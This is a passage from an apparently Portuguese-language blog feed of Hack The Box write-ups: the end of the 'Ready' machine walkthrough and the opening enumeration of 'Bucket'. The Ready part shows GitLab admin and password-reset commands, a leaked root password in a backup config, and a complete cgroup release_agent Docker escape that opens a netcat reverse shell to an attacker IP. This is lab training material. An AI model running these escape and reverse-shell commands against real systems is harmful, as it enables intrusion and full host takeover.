&lt;p&gt;Com base nas informações acima, ao validar os privilégios necessários para ler o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;, identificado que o usuário corrente (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt;), possuía acesso, logo obtivemos a flag de usuário.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@gitlab:/home/dude&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 24
drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 1 root root 4096 Dec  2 10:45 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:58 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dude dude  220 Aug 31  2015 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dude dude 3771 Aug 31  2015 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dude dude  655 May 16  2017 .profile
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt; 1 dude git    33 Dec  2 10:46 user.txt
git@gitlab:/home/dude&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;O próximo passo seria obter a flag de root. Tendo o hash de senha, conforme observado via enumeração do LinEnum poderíamos realizar o cracking dele usando algum dicionário, porém em buscas realizadas sobre este hash em sites da internet não resultaram em nada, logo deixei essa opção para o final, caso não encontre outro modo.&lt;/p&gt;

&lt;p&gt;Durante a enumeração do LinEnum, o seguinte texto é listado junto da listagem das contas:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner ‘user = User.find_by(email: “youruser@example.com”); user.admin = TRUE; user.save!’
Alternatively, you could change the password of any user by running: gitlab-rails runner ‘user = User.find_by(email: “admin@example.com”); user.password = “pass_peass_pass”; user.password_confirmation = “pass_peass_pass”; user.save!’&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Com base nesta informação, segui para o reset da senha do usuário root conforme recomendado, porém nenhum repositório privado ou informação adicional foi encontrada, que pudesse auxiliar na obtenção das credenciais de root.&lt;/p&gt;

&lt;p&gt;Uma vez que nao encontrei nenhum processo ou informação para o usuário dude e crackear a senha com base no hash identificado não era uma opção rápida, segui para a enumeração manual, onde acabei encontrando um diretório &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/backup&lt;/code&gt;, que continha diversos arquivos.&lt;/p&gt;

&lt;p&gt;Buscando neste diretório por palavras chaves como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;, encontrei uma entrada que chamou atenção no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/backup/gitlab.rb&lt;/code&gt;, conforme podemos ver abaixo dentre as linhas comentadas e em branco, removidas utilizando o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; listado&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@gitlab:/opt/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /opt/backup/gitlab.rb | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Ev&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'^#|^$'&lt;/span&gt;
gitlab_rails[&lt;span class=&quot;s1&quot;&gt;'smtp_password'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;wW59U!ZKMbG9+*#h&quot;&lt;/span&gt;
git@gitlab:/opt/backup&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Com a senha encontrada, testado para o usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, o que confirmou a validade da credencial, porém no diretório raiz deste usuário &lt;strong&gt;não existe um arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;&lt;/strong&gt;, o que indica que precisaremos escapar do container e obter a flag a partir do host docker.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@gitlab:/opt/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su root
Password:
root@gitlab:/opt/backup# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /root
total 28
drwx------ 1 root root 4096 Feb 27 13:24 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 1 root root 4096 Dec  1 12:41 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:56 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x 2 root root 4096 Feb 27 13:24 .nano
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  148 Aug 17  2015 .profile
drwx------ 2 root root 4096 Dec  7 16:49 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 root root 1565 Dec 13 15:06 .viminfo
root@gitlab:/opt/backup#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;escapando-do-container&quot;&gt;Escapando do container&lt;/h3&gt;

&lt;p&gt;Uma vez que temos privilégios de root, se o container estiver rodando sob circunstâncias especificas, podemos escapar do mesmo para o host, conforme encontrei a partir de uma pesquisa e extremamente bem documentado no blog &lt;a href=&quot;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&quot;&gt;Understanding Docker container escapes | Trail of Bits Blog&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Seguindo o passo-a-passo descrito neste blog, criado um listener na porta 4443 TCP na máquina atacante e realizados os seguintes procedimentos com o usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; no container, obtendo assim um shell reverso.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# In the container&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cgrp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cgroup &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rdma cgroup /tmp/cgrp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cgrp/x
 
&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/cgrp/x/notify_on_release
&lt;span class=&quot;nv&quot;&gt;host_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/.*\perdir=\([^,]*\).*/\1/p'&lt;/span&gt; /etc/mtab&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$host_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/cmd&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/cgrp/release_agent
 
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#!/bin/sh'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /cmd
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &amp;gt;/tmp/f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /cmd
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;a+x /cmd
 
sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; /tmp/cgrp/x/cgroup.procs&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Com a conexão recebida, confirmado que estávamos dentro do host executando o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt; e, na sequência, obtido a flag de root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.136] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.220] 38246
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# docker ps
CONTAINER ID        IMAGE                          COMMAND             CREATED             STATUS                 PORTS                                   NAMES
7eb263389e5e        gitlab/gitlab-ce:11.4.7-ce.0   &quot;/assets/wrapper&quot;   2 months ago        Up 5 hours (healthy)   22/tcp, 443/tcp, 0.0.0.0:5080-&amp;gt;80/tcp   docker-gitlab_web_1
# cat /root/root.txt
&amp;lt;redacted&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Espero que tenham gostado.&lt;/p&gt;

&lt;p&gt;Vejo vocês no próximo post! :smile:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-medium" /><category term="htb-linux" /><summary type="html">Olá pessoal! A máquina desta semana será Ready, outra máquina Linux classificada como mediana do Hack The Box, criada por bertolis.</summary></entry><entry><title type="html">Hackthebox write-up: Bucket</title><link href="https://davicruz.com/writeup/2021/04/htb-bucket/" rel="alternate" type="text/html" title="Hackthebox write-up: Bucket" /><published>2021-04-24T09:00:00-03:00</published><updated>2021-04-24T09:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/04/htb-bucket</id><content type="html" xml:base="https://davicruz.com/writeup/2021/04/htb-bucket/">&lt;p&gt;Olá pessoal!&lt;/p&gt;

&lt;p&gt;A máquina desta semana será &lt;strong&gt;Bucket&lt;/strong&gt;, outra máquina classificada como mediana do &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;Hack The Box&lt;/a&gt;, criada por &lt;a href=&quot;https://app.hackthebox.eu/users/13531&quot;&gt;MrR3boot&lt;/a&gt;. &lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Qp79TCm.png&quot; alt=&quot;HTB Bucket&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Particularmente achei essa máquina bem legal, onde tive a oportunidade de “brincar” um pouco com os serviços de armazenamento da AWS, mesmo que em uma instância local para desenvolvedores.&lt;/p&gt;

&lt;p&gt;A sua resolução esteve bastante ligada a este serviço onde tivemos que identificar uma forma de incluir um arquivo no site publicado para obter um shell reverso, obter a flag de user com credenciais existentes no DynamoDB.&lt;/p&gt;

&lt;p&gt;O flag de root foi obtido após abuso de uma aplicação ainda em desenvolvimento, onde utilizamos uma vulnerabilidade de LFI para obter a chave do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; e assim obter acesso interativo com esta conta.&lt;/p&gt;

&lt;h2 id=&quot;enumeração&quot;&gt;Enumeração&lt;/h2&gt;

&lt;p&gt;Como de costume, iniciamos com a enumeração rápida do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para identificar os serviços publicados nesta máquina:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.212
Nmap 7.91 scan initiated Fri Feb 26 08:16:37 2021 as: nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.212
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.212
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.077s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Fri Feb 26 08:16:48 2021 -- 1 IP address (1 host up) scanned in 10.55 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;80tcp---serviço-http&quot;&gt;80/TCP - Serviço HTTP&lt;/h3&gt;

&lt;p&gt;Uma vez que notei um redirect para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bucket.htb&lt;/code&gt;, incluí a entrada no arquivo hosts apontando para o endereço IP da máquina.&lt;/p&gt;

&lt;p&gt;Ao acessar o site, notei que diversas imagens não foram carregadas adequadamente, as quais apontavam para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3.bucket.htb&lt;/code&gt;, vide chamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; abaixo. Após incluir também esta entrada no arquivo hosts, o carregamento da página ocorreu com sucesso.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://bucket.htb | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Eo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'href=&quot;.*&quot;|src=&quot;.*&quot;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5344  100  5344    0     0  33822      0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 33822
&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;i &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fab fa-facebook-square&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;i &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fab fa-instagram&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;i &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fab fa-linkedin&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;i &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fab fa-twitter&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://s3.bucket.htb/adserver/images/bug.jpg&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Bug&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://s3.bucket.htb/adserver/images/cloud.png&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cheer&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://s3.bucket.htb/adserver/images/malware.png&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Malware&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;s3buckethtb&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3.bucket.htb&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;Ao identificar o DNS &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3.bucket.htb&lt;/code&gt; me chamou atenção para o nome, o qual faz referência ao serviço &lt;a href=&quot;https://aws.amazon.com/s3&quot;&gt;Amazon S3&lt;/a&gt;, que provê armazenamento de arquivos no formato blob em nuvem.&lt;/p&gt;

&lt;p&gt;Analisando o webserver da requisição para uma das URLs de imagem, notei que se utiliza de outro webserver (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hypercorn-h11&lt;/code&gt;), diferente do Apache listado no Scan do NMAP para a página na URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bucket.htb&lt;/code&gt;, o que significa que temos outro serviço na máquina ou há algum tipo de proxy na requisição neste virtual host.&lt;/p&gt;

&lt;p&gt;Para validar o que temos nesta estrutura, realizei uma enumeração utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; e encontrei dois diretórios interessantes: &lt;em&gt;health&lt;/em&gt; e &lt;em&gt;shell&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster-s3.txt
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://s3.bucket.htb
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/02/26 09:42:22 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/health &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/shell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Progress: 2643 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.20%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;É importante mencionar que são diretórios, pois o resultado para as chamadas em cada um dos nomes via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; com ou sem a barra ao final é diferente, conforme podemos ver abaixo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://s3.bucket.htb/health                                                                       
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;services&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;s3&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;running&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;dynamodb&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;running&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://s3.bucket.htb/health/
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;running&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;                                                                                                 
